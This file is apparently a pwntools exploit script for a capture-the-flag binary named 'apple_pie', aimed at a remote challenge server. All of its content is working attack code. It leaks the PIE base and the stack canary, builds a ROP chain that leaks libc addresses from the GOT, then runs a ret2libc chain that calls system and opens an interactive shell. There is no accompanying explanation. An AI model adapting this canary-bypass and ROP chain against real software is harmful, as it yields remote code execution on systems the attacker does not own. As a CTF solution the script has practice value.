from pwn import *

context.binary = elf = ELF('./apple_pie')
libc = ELF('./libc.so')

#Gadgets
pop_rdi = 0x0000000000001373
ret = 0x000000000000101a

#io = process()
#gdb.attach(io, api=True)
io = remote('pwn.h4ckingga.me', 10005)

# Round 1
io.recvuntil(b'0x')
elf.address = int(io.recvline(keepends=False), 16) - elf.sym['initialize']
log.info(f'ELF base: {hex(elf.address)}')
io.recvuntil(b'pie??\n')
io.sendline(b'Yes' + b'i'*53)
io.recvline()
canary = u64(io.recv(7).rjust(8, b'\0'))
log.info(f'Canary: {hex(canary)}')

io.recvuntil(b'chance!\n')
payload = b'i'*56 + p64(canary) + p64(0)
payload += p64(elf.address+pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts'])
payload += p64(elf.address+pop_rdi) + p64(elf.got['printf']) + p64(elf.plt['puts'])
payload += p64(elf.address+pop_rdi) + p64(elf.got['strncmp']) + p64(elf.plt['puts'])
payload += p64(elf.sym['main'])
io.sendline(payload)

puts = u64(io.recvline(keepends=False).ljust(8, b'\0'))
printf = u64(io.recvline(keepends=False).ljust(8, b'\0'))
strncmp = u64(io.recvline(keepends=False).ljust(8, b'\0'))
libc.address = puts - libc.sym['puts']
log.info(f'''puts: {hex(puts)}
printf: {hex(printf)}
strncmp: {hex(strncmp)}
Libc base: {hex(libc.address)}''')

# Round 2
io.recvuntil(b'pie??\n')
io.sendline(b'Yes')

io.recvuntil(b'chance!\n')
payload = b'i'*56 + p64(canary) + p64(0) + p64(elf.address+ret)
payload += p64(elf.address+pop_rdi) + p64(libc.address+0x1b75aa) + p64(libc.sym['system'])
payload += p64(elf.sym['main'])
io.sendline(payload)

io.interactive()